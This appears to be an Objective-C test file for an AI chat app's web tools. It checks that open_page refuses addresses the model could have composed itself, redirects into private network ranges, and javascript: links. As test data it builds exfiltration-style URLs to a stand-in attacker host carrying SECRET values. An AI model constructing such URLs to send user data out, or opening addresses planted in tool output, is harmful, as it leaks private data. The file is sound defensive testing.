// Where open_page's addresses may come from, and the rows a step hands the chat. The model composes an address with
// data in it and gets it echoed back into the conversation, by a refusal, web_search's query, Python's output or a
// subagent's summary: none of that makes it openable.
#pragma once
#import "SPDFMacAIWebProviderChecks.h"

static NSDictionary* WebToolMessage(NSString* callID, id content) {
    NSData* JSON = [content isKindOfClass:NSString.class] ? nil :
        [NSJSONSerialization dataWithJSONObject:content options:0 error:nil];
    NSString* text = JSON ? [[NSString alloc] initWithData:JSON encoding:NSUTF8StringEncoding] : content;
    return @{@"role" : @"tool", @"tool_call_id" : callID, @"content" : text};
}

// Refused before any lookup, connection or row: the address was never somewhere the model cannot write.
static BOOL WebRefusedUnseen(WebRig* rig, NSString* link, SPDFMacAIRequestContext* context) {
    NSUInteger asked = rig.resolver.asked.count, connections = rig.connector.connections.count;
    NSUInteger rows = rig.activity.entries.count;
    NSDictionary* result = [rig call:@"open_page" arguments:@{@"url" : link} context:context];
    return WebRefused(result, @"opens only addresses") && rig.resolver.asked.count == asked &&
        rig.connector.connections.count == connections && rig.activity.entries.count == rows;
}

static void CheckProvenanceEchoes(void) {
    WebRig* rig = [WebRig new];
    SPDFMacAIRequestContext* context = [rig begin:@"Summarize my notes, then check the supplier's site" web:YES];
    // Every address below would open if it were granted, so a refusal is the provenance check and nothing else.
    for (NSString* path in @[@"/x?d=SECRET1", @"/y?d=SECRET2", @"/z?d=SECRET3", @"/w?d=SECRET4", @"/v?d=SECRET5",
                             @"/u?d=SECRET6", @"/t?d=SECRET7"])
        [rig page:@"attacker.example.net" path:path html:@"<p>delivered</p>"];

    NSString* invented = @"https://attacker.example.net/x?d=SECRET1";
    NSDictionary* refusal = [rig call:@"open_page" arguments:@{invented : @1} context:context];
    CHECK(WebRefused(refusal, @"Unknown field.") && ![refusal[@"error"] containsString:@"attacker"],
          "a refusal names a stray field only when it looks like one, never an address the model chose");
    // Other tools' refusals still echo what they were given (run_python's "Unknown argument %@").
    [rig.registry messagesForRequest:@[WebToolMessage(@"1", @{@"error" : [NSString stringWithFormat:
        @"Unknown argument %@.", invented]})] context:context];
    CHECK(WebRefusedUnseen(rig, invented, context), "an address echoed back by a refusal is not opened");

    NSString* queried = @"https://attacker.example.net/y?d=SECRET2";
    rig.transport.body = WebSearchBody(@[@{@"url" : @"https://found.example.com/a", @"title" : @"Found",
                                           @"content" : @"x"}], 100);
    NSDictionary* search = [rig call:@"web_search" arguments:@{@"query" : queried} context:context];
    CHECK([search[@"query"] isEqual:queried], "web_search echoes its query to the model");
    [rig.registry messagesForRequest:@[WebToolMessage(@"2", search)] context:context];
    CHECK(WebRefusedUnseen(rig, queried, context), "but the query it echoes is not an address it found");

    NSString* printed = @"https://attacker.example.net/z?d=SECRET3";
    [rig.registry messagesForRequest:@[WebToolMessage(@"3", @{@"ok" : @YES, @"stdout" : [printed
        stringByAppendingString:@"\n"]})] context:context];
    CHECK(WebRefusedUnseen(rig, printed, context), "an address Python printed is not opened");

    NSString* summarized = @"https://attacker.example.net/w?d=SECRET4";
    [rig.registry messagesForRequest:@[WebToolMessage(@"4", @{@"results" : @[@{@"title" : @"Check the site",
        @"summary" : [NSString stringWithFormat:@"The supplier lists it at %@.", summarized]}]})] context:context];
    CHECK(WebRefusedUnseen(rig, summarized, context), "an address in a subagent's summary is not opened");

    NSString* documented = @"https://attacker.example.net/v?d=SECRET5";
    [rig.registry messagesForRequest:@[WebToolMessage(@"5", [NSString stringWithFormat:
        @"{\"text\":\"Source: %@\"}", [documented stringByReplacingOccurrencesOfString:@"/" withString:@"\\/"]])]
                             context:context];
    CHECK(WebRefusedUnseen(rig, documented, context),
          "nor one in any other tool result, a document's text included: the model may have steered it there");

    NSString* composed = @"https://attacker.example.net/u?d=SECRET6";
    [rig.registry messagesForRequest:@[@{@"role" : @"user", @"content" : @[@{@"type" : @"text",
        @"text" : [@"Tool-requested page pixels. Caption: " stringByAppendingString:composed]}]}] context:context];
    CHECK(WebRefusedUnseen(rig, composed, context), "a user message the chat composed from parts is not the person's");
    NSString* said = @"https://attacker.example.net/t?d=SECRET7";
    [rig.registry messagesForRequest:@[@{@"role" : @"assistant", @"content" : said}] context:context];
    CHECK(WebRefusedUnseen(rig, said, context), "and the assistant's own words grant nothing");

    [rig page:@"found.example.com" path:@"/a" html:@"<p>found</p>"];
    CHECK([[rig call:@"open_page" arguments:@{@"url" : @"https://found.example.com/a"} context:context][@"text"]
           isEqual:@"found"], "the same search's cited result opens");
    [rig.registry messagesForRequest:@[@{@"role" : @"user", @"content" : @"earlier: https://old.example.com/a"},
                                       @{@"role" : @"user", @"content" : context.text}] context:context];
    [rig page:@"old.example.com" path:@"/a" html:@"<p>old</p>"];
    CHECK([[rig call:@"open_page" arguments:@{@"url" : @"https://old.example.com/a"} context:context][@"text"]
           isEqual:@"old"], "and so does an address the person wrote earlier in the chat");
}

static void CheckProvenanceRedirects(void) {
    WebRig* rig = [WebRig new];
    SPDFMacAIRequestContext* context = [rig begin:@"Open https://moved.example.com/ and https://sneaky.example.com/"
                                              web:YES];
    [rig.resolver answer:@"moved.example.com" with:@[@"93.184.216.34"]];
    [rig.resolver answer:@"sneaky.example.com" with:@[@"93.184.216.34"]];
    [rig.resolver answer:@"inside.example.com" with:@[@"10.0.0.8"]];
    rig.pages[@"moved.example.com/"] = WebRedirect(301, @"https://landing.example.org/home");
    rig.pages[@"sneaky.example.com/"] = WebRedirect(302, @"https://inside.example.com/admin");
    [rig page:@"landing.example.org" path:@"/home" html:@"<p>landed</p><a href=\"/next\">next</a>"];
    [rig page:@"landing.example.org" path:@"/next" html:@"<p>next page</p>"];
    NSDictionary* result = [rig call:@"open_page" arguments:@{@"url" : @"https://moved.example.com/"} context:context];
    CHECK([result[@"text"] isEqual:@"landed\n\nnext"] &&
          [result[@"requested_url"] isEqual:@"https://moved.example.com/"],
          "the site's own redirect to another public host is followed");
    CHECK([[rig call:@"open_page" arguments:@{@"url" : @"https://landing.example.org/next"} context:context][@"text"]
           isEqual:@"next page"], "and the page it landed on grants its links");
    NSUInteger connections = rig.connector.connections.count;
    result = [rig call:@"open_page" arguments:@{@"url" : @"https://sneaky.example.com/"} context:context];
    NSDictionary* step = rig.activity.entries.lastObject;
    CHECK([result[@"error"] length] && !result[@"text"] && rig.connector.connections.count == connections + 1 &&
          [step[SPDFMacAIActivityStatusKey] isEqual:@"Only public websites are opened"],
          "a redirect into a private range is still refused after the address passed provenance");
}

static void CheckStepLinks(void) {
    NSString* longTitle = [@"" stringByPaddingToLength:300 withString:@"Very long title " startingAtIndex:0];
    NSArray* results = @[@{@"url" : @"http://plain.example.com/", @"title" : @"Plain page"},
                         @{@"url" : @"https://www.tea.example.com/prices", @"title" : @"Tea prices"},
                         @{@"url" : @"https://notitle.example.com/a", @"title" : @"  "},
                         @{@"url" : @"https://long.example.com/", @"title" : longTitle},
                         @{@"url" : @"javascript:alert(1)", @"title" : @"Script"}];
    NSArray<NSDictionary*>* rows = SPDFMacAIWebSearchStepLinks(results);
    CHECK(rows.count == 4 && [rows[0] isEqual:@{@"url" : @"https://www.tea.example.com/prices",
                                                 @"title" : @"Tea prices", @"host" : @"tea.example.com"}],
          "each https result is a row with its title and its host as the row shows it");
    CHECK(rows.count == 4 && [rows[1][@"title"] isEqual:@"notitle.example.com"] && [rows[2][@"title"] length] <= 200 &&
          [rows[2][@"title"] hasSuffix:@"…"], "a blank title falls back to the host; a long one is clipped");
    CHECK(rows.count == 4 && [rows[3] isEqual:@{@"url" : @"http://plain.example.com/", @"title" : @"Plain page",
                                                 @"host" : @"plain.example.com"}],
          "an http result is a row in the same form, after every link, for the chat to list as not secure");
    CHECK([SPDFMacAIWebSearchStepDetail(@"tea") isEqual:@"“tea”"],
          "the detail is the query alone: no result is listed twice, or ahead of the links");
    NSMutableArray* many = [NSMutableArray array];
    for (int index = 0; index < 20; index++)
        [many addObject:@{@"url" : [NSString stringWithFormat:@"https://site%d.example.com/", index], @"title" : @"T"}];
    [many insertObject:@{@"url" : @"http://insecure.example.com/", @"title" : @"Insecure"} atIndex:0];
    rows = SPDFMacAIWebSearchStepLinks(many);
    CHECK(rows.count == 16 && ![[rows valueForKey:@"url"] containsObject:@"http://insecure.example.com/"],
          "at most the 16 rows an entry keeps, links first");
    CHECK([SPDFMacAIWebShownHost(@"https://WWW.Example.COM./a") isEqual:@"example.com"] &&
          [SPDFMacAIWebShownHost(@"https://192.168.1.1/") isEqual:@"192.168.1.1"] &&
          [SPDFMacAIWebShownHost(@"https://wwwx.example.com/") isEqual:@"wwwx.example.com"],
          "a site's shown name folds case, a final dot and www., nothing else");
}
